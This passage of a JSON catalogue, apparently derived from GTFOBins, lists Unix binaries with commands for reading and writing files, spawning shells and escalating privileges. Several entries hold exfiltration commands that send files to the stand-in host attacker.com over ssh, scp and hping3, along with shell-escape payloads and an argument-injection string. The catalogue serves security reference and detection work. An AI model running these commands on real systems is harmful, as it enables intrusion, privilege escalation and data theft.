                    "code": "gzip -c /path/to/input-file | gzip -d"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gzip usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gzip/"
                }
            ]
        },
        {
            "name": "apache2ctl",
            "description": "Unix binary apache2ctl.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "apache2ctl -c 'Include /path/to/input-file'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor apache2ctl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/apache2ctl/"
                }
            ]
        },
        {
            "name": "ss",
            "description": "Unix binary ss.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ss -a -F /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ss usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ss/"
                }
            ]
        },
        {
            "name": "ssh",
            "description": "Unix binary ssh.",
            "categories": [
                "execute",
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "ssh user@attacker.com 'cat /path/to/input-file\""
                },
                {
                    "label": "FILE-READ: ",
                    "code": "ssh -F /path/to/input-file x"
                },
                {
                    "label": "SHELL: ",
                    "code": "ssh localhost /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x"
                },
                {
                    "label": "SHELL: ",
                    "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "echo DATA | ssh user@attacker.com 'cat >/path/to/output-file\""
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ssh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ssh/"
                }
            ]
        },
        {
            "name": "zsoelim",
            "description": "Unix binary zsoelim.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "zsoelim /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zsoelim usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zsoelim/"
                }
            ]
        },
        {
            "name": "pipx",
            "description": "Unix binary pipx.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >/path/to/file.py\npipx run /path/to/file.py"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pipx usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pipx/"
                }
            ]
        },
        {
            "name": "nice",
            "description": "Unix binary nice.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "nice /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nice usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nice/"
                }
            ]
        },
        {
            "name": "xdg-user-dir",
            "description": "Unix binary xdg-user-dir.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "xdg-user-dir '}; /bin/sh #'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xdg-user-dir usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xdg-user-dir/"
                }
            ]
        },
        {
            "name": "dmsetup",
            "description": "Unix binary dmsetup.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -s'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dmsetup usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dmsetup/"
                }
            ]
        },
        {
            "name": "ascii85",
            "description": "Unix binary ascii85.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ascii85 /path/to/input-file | ascii85 --decode"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ascii85 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ascii85/"
                }
            ]
        },
        {
            "name": "genisoimage",
            "description": "Unix binary genisoimage.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "genisoimage -q -o - /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "genisoimage -sort /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor genisoimage usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/genisoimage/"
                }
            ]
        },
        {
            "name": "sed",
            "description": "Unix binary sed.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "sed '' /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts"
                },
                {
                    "label": "SHELL: ",
                    "code": "sed -n '1e exec /bin/sh 1>&0' /etc/hosts"
                },
                {
                    "label": "SHELL: ",
                    "code": "sed e"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sed usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sed/"
                }
            ]
        },
        {
            "name": "msgconv",
            "description": "Unix binary msgconv.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "msgconv -P /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor msgconv usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/msgconv/"
                }
            ]
        },
        {
            "name": "rustc",
            "description": "Unix binary rustc.",
            "categories": [
                "file-read",
                "file-write",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "rustc /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo 'fn main() { println!(\"DATA\"); }' >/path/to/temp-file\nrustc /path/to/temp-file -o /path/to/output-file"
                },
                {
                    "label": "INHERIT: ",
                    "code": "rustc --explain E0001"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rustc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rustc/"
                }
            ]
        },
        {
            "name": "posh",
            "description": "Unix binary posh.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "posh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor posh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/posh/"
                }
            ]
        },
        {
            "name": "hping3",
            "description": "Unix binary hping3.",
            "categories": [
                "shell",
                "execute"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "hping3\n/bin/sh"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor hping3 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/hping3/"
                }
            ]
        },
        {
            "name": "od",
            "description": "Unix binary od.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "od -An -c -w999 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor od usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/od/"
                }
            ]
        },
        {
            "name": "sudo",
            "description": "Unix binary sudo.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "sudo /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sudo usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sudo/"
                }
            ]
        },
        {
            "name": "cp",
            "description": "Unix binary cp.",
            "categories": [
                "file-read",
                "file-write",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "cp /path/to/input-file /dev/stdout"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | cp /dev/stdin /path/to/output-file"
                },
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "cp /path/to/input-file /path/to/output-file"
                },
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cp/"
                }
            ]
        },
        {
            "name": "task",
            "description": "Unix binary task.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "task execute /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor task usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/task/"
                }
            ]
        },
        {
            "name": "rpmdb",
            "description": "Unix binary rpmdb.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "rpmdb --eval '%{lua:...}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "rpmdb --eval '%(/bin/sh 1>&2)'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rpmdb usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rpmdb/"
                }
            ]
        },
        {
            "name": "check_memory",
            "description": "Unix binary check_memory.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "check_memory --extra-opts=@/path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor check_memory usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/check_memory/"
                }
            ]
        },
        {
            "name": "perlbug",
            "description": "Unix binary perlbug.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor perlbug usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/perlbug/"
                }
            ]
        },
        {
            "name": "pygmentize",
            "description": "Unix binary pygmentize.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pygmentize -l text /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pygmentize usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pygmentize/"
                }
            ]
        },
        {
            "name": "file",
            "description": "Unix binary file.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "file -f /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "file -m /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor file usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/file/"
                }
            ]
        },
        {
            "name": "zsh",
            "description": "Unix binary zsh.",
            "categories": [
                "file-read",
                "file-write",
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "zsh -c 'echo \"$(</path/to/input-file)\"'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "zsh -c '</path/to/input-file'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "zsh -c 'echo DATA >/path/to/output-file'"
                },
                {
                    "label": "INHERIT: ",
                    "code": "zsh -c '</etc/hosts'"
                },
                {
                    "label": "SHELL: ",
                    "code": "zsh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zsh/"
                }
            ]
        },
        {
            "name": "ctr",
            "description": "Unix binary ctr.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ctr usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ctr/"
                }
            ]
        },
        {
            "name": "easy_install",
            "description": "Unix binary easy_install.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >setup.py\neasy_install ."
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor easy_install usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/easy_install/"
                }
            ]
        },
        {
            "name": "scp",
            "description": "Unix binary scp.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "scp user@attacker.com:/path/to/input-file /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file\nchmod +x /path/to/temp-file\nscp -S /path/to/temp-file x x:"
                },
                {
                    "label": "SHELL: ",
                    "code": "scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "scp /path/to/input-file user@attacker.com:/path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor scp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/scp/"
                }
            ]
        },
        {
            "name": "jtag",
            "description": "Unix binary jtag.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "jtag --interactive\nshell /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor jtag usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/jtag/"
                }
            ]
        },
        {
            "name": "cpulimit",
            "description": "Unix binary cpulimit.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "cpulimit -l 100 -f /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cpulimit usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cpulimit/"
                }
            ]
        },
        {
            "name": "nano",
            "description": "Unix binary nano.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "nano /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "nano /path/to/output-file\nDATA\n^O"
                },
                {
                    "label": "SHELL: ",
                    "code": "nano\n^R^X\nreset; sh 1>&0 2>&0"
                },
                {
                    "label": "SHELL: ",
                    "code": "nano -s /bin/sh\n/bin/sh\n^T^T"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nano usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nano/"
                }
            ]
        },
        {
            "name": "ln",
            "description": "Unix binary ln.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "ln -fs /bin/sh /bin/ln\nln"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ln usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ln/"
                }
            ]
        },
        {
            "name": "top",
            "description": "Unix binary top.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor top usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/top/"
                }
            ]
        },
        {
            "name": "vipw",
            "description": "Unix binary vipw.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "vipw"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor vipw usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/vipw/"
                }
            ]
        },
        {
            "name": "cmp",
            "description": "Unix binary cmp.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "cmp /path/to/input-file /dev/zero -b -l"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cmp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cmp/"
                }
            ]
        },
        {
            "name": "sqlmap",
            "description": "Unix binary sqlmap.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "sqlmap -u 127.0.0.1 --eval='...'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sqlmap usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sqlmap/"
                }
            ]
        },
        {
            "name": "torsocks",
            "description": "Unix binary torsocks.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "torsocks /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor torsocks usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/torsocks/"
                }
            ]
        },
        {
            "name": "nginx",
            "description": "Unix binary nginx.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
                },
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "cat >/path/to/temp-file <<EOF\nload_module /path/to/lib.so\nEOF\n\nnginx -t -c /path/to/temp-file"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nginx usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nginx/"
                }
            ]
        },
        {
            "name": "pandoc",
            "description": "Unix binary pandoc.",
            "categories": [
                "file-read",
                "file-write",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pandoc -t plain /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | pandoc -t plain -o /path/to/output-file"
                },
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pandoc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pandoc/"
                }
            ]
        },
        {
            "name": "nsenter",
            "description": "Unix binary nsenter.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "nsenter /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nsenter usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nsenter/"
                }
            ]
        },
        {
            "name": "cupsfilter",
            "description": "Unix binary cupsfilter.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cupsfilter usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cupsfilter/"
                }
            ]
        },
        {
            "name": "nasm",
            "description": "Unix binary nasm.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "nasm -@ /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nasm usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nasm/"
                }
            ]
        },
        {
            "name": "tsc",
            "description": "Unix binary tsc.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "tsc /path/to/input-file.ts"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "tsc /path/to/input-file.ts --outFile /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tsc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tsc/"
                }
            ]
        },
        {
            "name": "rpmverify",
            "description": "Unix binary rpmverify.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "rpmverify --eval '%{lua:...}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "rpmverify --eval '%(/bin/sh 1>&2)'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rpmverify usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rpmverify/"
                }
            ]
        },
        {
            "name": "ldconfig",
            "description": "Unix binary ldconfig.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "echo /path/to/temp-dir/ >/path/to/temp-file\nldconfig -f /path/to/temp-file\nping"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ldconfig usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ldconfig/"
                }
            ]
        },
        {
            "name": "bpftrace",
            "description": "Unix binary bpftrace.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "bpftrace --unsafe -e 'BEGIN {system(\"/bin/sh 1<&0\");exit()}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'BEGIN {system(\"/bin/sh 1<&0\");exit()}' >/path/to/temp-file\nbpftrace --unsafe /path/to/temp-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "bpftrace -c /bin/sh -e 'END {exit()}'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bpftrace usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bpftrace/"
                }
            ]
        },
        {
            "name": "mutt",
            "description": "Unix binary mutt.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "mutt -F /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mutt usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mutt/"
                }
            ]
        },
        {
            "name": "yash",
            "description": "Unix binary yash.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "yash"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor yash usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/yash/"
                }
            ]
        },
        {
            "name": "zic",
            "description": "Unix binary zic.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file\necho 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file\nzic -d . -y /path/to/command /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
